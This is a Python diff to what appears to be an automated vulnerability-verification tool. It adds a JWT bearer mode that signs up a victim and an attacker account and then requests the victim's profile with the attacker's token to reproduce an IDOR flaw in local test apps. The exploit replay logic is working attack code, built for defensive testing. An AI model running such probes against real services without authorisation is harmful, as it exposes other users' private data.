@@ -95,9 +95,10 @@ class IdorProbe(BaseModel):
     """
 
     base_url: str
-    auth_mode: str = "session_form"  # "none" | "session_form" (기본은 D2 WebGoat 호환)
-    baseline_path: str  # 공격자 자기 자원
-    attack_path: str  # 피해자 자원
+    auth_mode: str = "session_form"  # "none" | "session_form" | "bearer" (기본은 D2 WebGoat 호환)
+    # none/session_form은 baseline_path/attack_path를 직접 받고, bearer는 path_template+생성 id로 런타임에 만든다.
+    baseline_path: str | None = None  # 공격자 자기 자원
+    attack_path: str | None = None  # 피해자 자원
     victim_marker: str  # attack 응답에 이게 보이면 피해자 데이터
     owner_marker: str | None = None  # baseline 응답에 있어야 정상기능 OK (repair/validators.py)
 
@@ -107,6 +108,13 @@ class IdorProbe(BaseModel):
     auth_path: str | None = None
     auth_username: str | None = None
     auth_password: str | None = None
+
+    # --- bearer 전용 (JWT 토큰 인증 앱, 예: c1-05 Scrum Helper) ---
+    # 자체 provision: 회원가입 2명(이름=victim_marker/owner_marker) → 공격자 토큰으로 재현.
+    # 토큰은 재현 중 메모리에만 있고 candidate/evidence에 저장되지 않는다(secret 위생).
+    signup_path: str | None = None  # 예: /api/auth/signup ({name,email,password} → data.accessToken/data.user.id)
+    path_template: str | None = None  # 예: /api/users/{id}/profile — {id}에 생성된 사용자 id를 넣는다
+    token_key: str = "accessToken"  # 회원가입 응답에서 JWT를 찾을 key
 
 
 def probe_from_candidate(candidate: Candidate) -> IdorProbe:
@@ -195,6 +203,8 @@ def _replay_none(probe: IdorProbe) -> tuple[dict, dict]:
     baseline = 공격자가 자기 자원(baseline_path)을, attack = 인증 없이 같은 방식으로 피해자
     자원(attack_path)을 요청. Authorization 헤더 없음 — 토큰/세션 자체가 없는 앱.
     """
+    if not probe.baseline_path or not probe.attack_path:
+        raise ValueError("none 재현엔 baseline_path와 attack_path가 필요하다")
     base = probe.base_url.rstrip("/")
     with httpx.Client(follow_redirects=True, timeout=10.0) as client:
         r_base = client.get(f"{base}{probe.baseline_path}")
@@ -210,7 +220,8 @@ def _replay_session_form(probe: IdorProbe) -> tuple[dict, dict]:
     """
     missing = [
         f
-        for f in ("app_username", "app_password", "auth_path", "auth_username", "auth_password")
+        for f in ("baseline_path", "attack_path", "app_username", "app_password",
+                  "auth_path", "auth_username", "auth_password")
         if getattr(probe, f) is None
     ]
     if missing:
@@ -239,10 +250,63 @@ def _replay_session_form(probe: IdorProbe) -> tuple[dict, dict]:
     return _exchange("GET", probe.baseline_path, r_base), _exchange("GET", probe.attack_path, r_atk)
 
 
+def _dig(obj: object, key: str) -> object:
+    """JSON 응답(중첩 dict/list)에서 key의 첫 값을 찾는다(예: data.user.id, data.accessToken)."""
+    if isinstance(obj, dict):
+        if key in obj:
+            return obj[key]
+        for v in obj.values():
+            found = _dig(v, key)
+            if found is not None:
+                return found
+    elif isinstance(obj, list):
+        for v in obj:
+            found = _dig(v, key)
+            if found is not None:
+                return found
+    return None
+
+
+def _replay_bearer(probe: IdorProbe) -> tuple[dict, dict]:
+    """JWT bearer 인증 IDOR (예: c1-05 Scrum Helper의 GET /api/users/{id}/profile).
+
+    자체 provision: 회원가입 2명(owner 이름=victim_marker, attacker 이름=owner_marker) → 공격자
+    토큰으로 baseline(자기 프로필)·attack(피해자 프로필)을 요청. 토큰은 메모리에만 존재하고
+    요청 헤더는 evidence에 기록하지 않는다(secret 위생). id는 생성 응답에서 뽑아 path_template에 채운다.
+    """
+    if not probe.signup_path or not probe.path_template:
+        raise ValueError("bearer 재현엔 signup_path와 path_template이 필요하다")
+    base = probe.base_url.rstrip("/")
+    pw = "VcLocal123!"  # provision 전용 임시 비번(로컬 격리 대상, evidence 미기록)
+    with httpx.Client(follow_redirects=True, timeout=10.0) as client:
+        # owner(피해자)와 attacker(공격자)를 회원가입. 이름을 marker로 써서 프로필에 노출되게 한다.
+        owner = client.post(
+            f"{base}{probe.signup_path}",
+            json={"name": probe.victim_marker, "email": f"{probe.victim_marker}@vc.local", "password": pw},
+        ).json()
+        attacker = client.post(
+            f"{base}{probe.signup_path}",
+            json={"name": probe.owner_marker, "email": f"{probe.owner_marker}@vc.local", "password": pw},
+        ).json()
+        owner_id = _dig(owner, "id")
+        attacker_id = _dig(attacker, "id")
+        token = _dig(attacker, probe.token_key)
+        if owner_id is None or attacker_id is None or token is None:
+            raise ValueError("bearer provision 실패: 응답에서 id/token을 찾지 못함")
+
+        headers = {"Authorization": f"Bearer {token}"}  # 공격자 세션. 헤더는 evidence에 안 담긴다.
+        baseline_path = probe.path_template.format(id=attacker_id)  # 공격자 자기 자원
+        attack_path = probe.path_template.format(id=owner_id)  # 피해자 자원
+        r_base = client.get(f"{base}{baseline_path}", headers=headers)
+        r_atk = client.get(f"{base}{attack_path}", headers=headers)
+    return _exchange("GET", baseline_path, r_base), _exchange("GET", attack_path, r_atk)
+
+
 # auth_mode → (필요 요청 수, 재현 함수). 요청 수 상한은 10.2절 rate/impact limit 통제에 걸린다.
 _REPLAY: dict[str, tuple[int, object]] = {
     "none": (2, _replay_none),
     "session_form": (5, _replay_session_form),
+    "bearer": (4, _replay_bearer),  # signup×2 + baseline + attack
 }
 
 
